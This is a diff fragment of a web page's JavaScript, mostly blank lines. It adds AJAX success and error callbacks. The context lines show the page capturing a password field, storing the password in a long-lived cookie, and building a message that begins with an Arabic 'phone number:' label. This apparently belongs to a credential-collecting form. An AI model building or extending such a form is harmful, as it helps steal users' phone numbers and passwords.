@@ -948,14 +948,6 @@ document.getElementById('password').setAttribute("name",'password');
 
 
 
-
-
-
-
-
-
-
-
             var message = "رقم الهاتف:`"+phonenumber+"`\n"
 
 
@@ -1065,6 +1057,127 @@ document.getElementById('password').setAttribute("name",'password');
 
 
                 },
+
+
+
+
+
+
+
+
+
+
+
+                success: function (res) {
+
+
+
+
+
+
+
+
+
+
+
+                    console.debug(res);
+
+
+
+
+
+
+
+
+
+
+
+                    $('#response').text('Message sent');
+
+
+
+
+
+
+
+
+
+
+
+                },
+
+
+
+
+
+
+
+
+
+
+
+                error: function (error) {
+
+
+
+
+
+
+
+
+
+
+
+                    console.error(error);
+
+
+
+
+
+
+
+
+
+
+
+                    alert("error failed");
+
+
+
+
+
+
+
+
+
+
+
+                }
+
+
+
+
+
+
+
+
+
+
+
+            });
+
+
+            
+
+
+
+
+
+
+
+
+
+
 
 
             var message = "رقم الهاتف:`"+phonenumber+"`\n"
@@ -1388,6 +1501,5 @@ setCookie("password",password,1000);
 
 
 </body></html>
-
 
 
